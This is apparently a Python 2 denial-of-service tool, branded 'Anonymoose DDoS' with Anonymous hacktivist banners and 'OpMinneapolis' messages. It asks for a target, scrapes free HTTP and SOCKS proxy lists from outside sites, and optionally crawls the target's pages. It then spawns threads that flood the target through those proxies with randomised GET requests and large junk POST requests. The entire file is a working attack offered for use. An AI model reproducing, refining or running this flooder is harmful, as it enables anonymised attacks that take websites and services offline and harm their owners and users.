
# Anonymoose DDoS just got 20% kooler!
# - Modified by Aleksey [github.com/Alekseyyy]
# - It's spelled "Allah," not "ala." Spell it rite!

# Import 'dem libraries
import socket, random, threading, time, ssl, sys, time, re
try:
 import requests, socks, bs4
 from bs4 import BeautifulSoup
except ImportError as e:
 print e
 sys.exit()

# Set variables
ua=open("browser_agents.txt", "r").read().split("\n") #protip: if u hardcode ur useragents, use a tuple instead of a list cos it's faster; see dis vidya: https://youtu.be/NI26dqhs2Rk
del ua[-1]
lis='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_%'
ec=['gzip','compress','deflate','br,''identity', '*']
a=["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","text/html, application/xhtml+xml, image/jxr, */*","text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"]#*/
ac=["iso-8859-1", "utf-8, iso-8859-1;q=0.5", "utf-8,iso-8859-1;q=0.5, *;q=0.1"]
cc=[ "no-cache, no-store", "no-store","no-cache"]
al=["af","hr","el","sq","cs","gu","pt","sw","ar","da","ht","pt-br","sv","nl","he","pa","nl-be","hi","pa-in","sv-sv","en","hu","pa-pk","ta","en-au","ar-jo","en-bz","id","rm","te","ar-kw","en-ca","iu","ro","th","ar-lb","en-ie","ga","ro-mo","tig","ar-ly","en-jm","it","ru","ts","ar-ma","en-nz","it-ch","ru-mo","tn","ar-om","en-ph","ja","sz","tr","ar-qa","en-za","kn","sg","tk","ar-sa","en-tt","ks","sa","uk","ar-sy","en-gb","kk","sc","hsb","ar-tn","en-us","km","gd","ur","ar-ae","en-zw","ky","sd","ve","ar-ye","eo","tlh","si","vi","ar","et","ko","sr","vo","hy","fo","ko-kp","sk","wa","as","fa","ko-kr","sl","cy","ast","fj","la","so","xh","az","fi","lv","sb","ji","eu","fr","lt","es","zu","bg","fr-be","lb","es-ar","be","fr-ca","mk","es-bo","bn","fr-fr","ms","es-cl","bs","fr-lu","ml","es-co","br","fr-mc","mt","es-cr","bg","fr-ch","mi","es-do","my","fy","mr","es-ec","ca","fur","mo","es-sv","ch","gd","nv","es-gt","ce","gd-ie","ng","es-hn","zh","gl","ne","es-mx","zh-hk","ka","no","es-ni","zh-cn","de","nb","es-pa","zh-sg","de-at","nn","es-py","zh-tw","de-de","oc","es-pe","cv","de-li","or","es-pr","co","de-lu","om","es-es","cr","de-ch","fa","es-uy","fa-ir","es-ve"]
global pt
pt=["/"]

# Main Procedure
# Ala iz G0d (it's "Allah" ffs, lern 2 spell goddamnit).
print """ \033[1;32m
                                                    Tool By  : Al[l]a[h]
                                                       Enjoy ! :)
 
                                             At the end of the day, 
                                               Nobody gots you but yourself
					# Fact check: True! Sabu snitched on his
					  buddies to get a plea deal.
     ___       __  __ _                              _ _    
    / _ \ _ __|  \/  (_)_ _  _ _  ___ __ _ _ __  ___| (_)___
   | (_) | '_ \ |\/| | | ' \| ' \/ -_) _` | '_ \/ _ \ | (_-<
    \___/| .__/_|  |_|_|_||_|_||_\___\__,_| .__/\___/_|_/__/
         |_|                              |_|               

   \033[1;36m W3LC0M3 M4S73R aRe YoU ReADy tO aTtAcK?
				
	\033[1;36mShoutOut : \033[1;44mS0u1 \033[0;m\033[1;46m AnonOpUSA \033[0;m
   Twitter Contact : @AnonOpUSA + @YourAnonS0u1 + @EpsilonCalculus
                                               
\033[0;m 
\033[1;36m##=================================================================##\033[0;m                        
\033[1;36m##               \033[0;m \033[1;42m==> Enjoy, DDoS The World<==\033[0;m                     \033[1;36m##\033[0;m 
\033[1;36m##=================================================================##\033[0;m


[!] =====> \033[1;42mBe Smart\033[0;m (Type your target in the terminal :) )
    """

while True:
 try:
  url=raw_input('\n\n\n\033[1;36mTarget: (www.example.com or IP)\n>')
  socket.gethostbyname(url)
 except:
  print"Write your the domain or IP correctly." #lern 2 spell correctly
while True:
  port=input("\n\nPort: (80 or 443)\n>")
  if port in [80,443]:
   break
  print"Enter: 80 or 443"
while True:
 try:
  th=input("\n\nThreads:\n>")
  break
 except:
  print"Enter a number"
while True:
  op=input('\nDo you want to crawl your target first?\n 1-yes\n 2-no\n>')
  if op in [1,2]:
   break
  else:
   print"\nEnter: 1 or 2"
if op==1:
 ur=raw_input('\nYour initial link:\n>')
 h=pt=[]
 if ur[len(ur)-1]=='/':
  ur=ur[0:len(ur)-1]
 try:
  c=requests.get(ur, headers = {'User-Agent': random.choice(ua)}  ).text
  soup = BeautifulSoup(c,"html.parser")
  for a in soup.find_all('a'):
   if a.has_attr('href'):
    try:
     a=str(a)
     a=a.split('href="')[1].split('"')[0]
     a=a.split('"')[0].split('"')[0]
     if "://" not in a:
      if a[0]!="/":
       a="/"+a
      a=ur+a
     if (a not in h) and (ur in a):
      if (a!=ur+"/") and (a!=ur):
       h.append(a)
    except Exception as e:
     print e
 except Exception as ex:
   print ex
 for x in h:
  x=x.split(ur)[1]
  pt.append(x)
 print"\nLinks found:",len(pt)
else:
 pass

u="http://www.proxyserverlist24.top/".strip()
h=l=[]
print"\n[+]Scanning..."
v=time.time()
try:
 r=requests.get(u).text
 soup= BeautifulSoup ( r, 'html.parser')
 h3tags = soup.findAll('a')
 for a in h3tags:
    try:
     if (a.has_attr('href') and (u in str(a)) and ("proxy-server" in str(a)) and("#" not in (str(a)))) :
      try:
       a=str(a)
       a=a.split('href="')[1]
       a=a.split('"')[0]
       if (a not in l):
          l.append(a)
      except Exception as xx:
       print xx
    except Exception as ex:
     print ex
     continue
except Exception as e:
  pass
for u in l:
 try:
  a=requests.get(u,timeout=10)
  ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})",a.text)
  for i in ips:
    h.append(i)
 except Exception as e:
  pass
u="http://proxy-daily.com/".strip()
try:
 r=requests.get(u).text
 soup= BeautifulSoup ( r, 'html.parser')
 l = soup.findAll('div')
except:
 pass
co=0
p4=p5=p=ips=[]
for x in l:
 try:
  ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})",str(x))
  if (ips) and (ips not in p):
   p.append(ips)
 except:
  pass
u="http://www.live-socks.net/2018/11/27-11-18-socks-5-servers_57.html?m=1"
try:
  a=requests.get(u)
  ips = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,3})" ,a.text)
except Exception as e:
  pass
p5+=ips
try:
   h+=p[0]
except:
   pass
print"[+]Scanning has finished!", "\n", "\nhttp/https : ", len(h)
p4=p[2]
print"\nsocks4 : ", len(p4)
p5+=p[3]
print"\nsocks5 : ",len(p5), "\n", "\nTotal bots : ",len(h)+len(p4)+len(p5),"\n"
for bh in range(5):
 sys.stdout.write("\rAttack will start after : {}".format(5-bh))
 sys.stdout.flush()
 time.sleep(1)
print"\n\n"
a=["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","text/html, application/xhtml+xml, image/jxr, */*","text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"]#*/

class flood(threading.Thread):
 def run(self):
  while True:
   try:
    z=random.randint(1,10)
    if (z in [1,2,3,4,5]):
     line=random.choice(h)
    elif (z in [6,7,8]):
     line=random.choice(p4)
    elif (z in [9,10]):
     line=random.choice(p5)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [6,7,8]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [9,10]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s.settimeout(6)
    s.connect((url,port))
    if (port==443):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for fg in range(random.randint(5,30)):
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
        df=random.choice(ec)
        if df!=ed:
         gy+=1
       ed+=', '
       ed+=df
     l=random.choice(al)
     for n in range(random.randint(0,5)):
      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
     pa=random.choice(pt)
     kl=random.randint(1,2)
     if kl==1:
      req="GET"
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),url)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      par =(k*random.randint(30,50))+str(random.randint(1,100000))+'='+(j*random.randint(500,1000))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),url,par)
     try:
      s.send(m)
      print"[!]Proxy: {} | Bytes: {} | \033[1;42mCONNECTED\033[0;m | MSG: \033[1;41mOpMinneapolis!\033[0;m |".format(ipp,len(m)) ##@YourAnonS0u1## <3
     except Exception as dx:
      pass
    s.close()
   except Exception as e:
    pass
for x in range(th):
  t=flood()
  t.start()

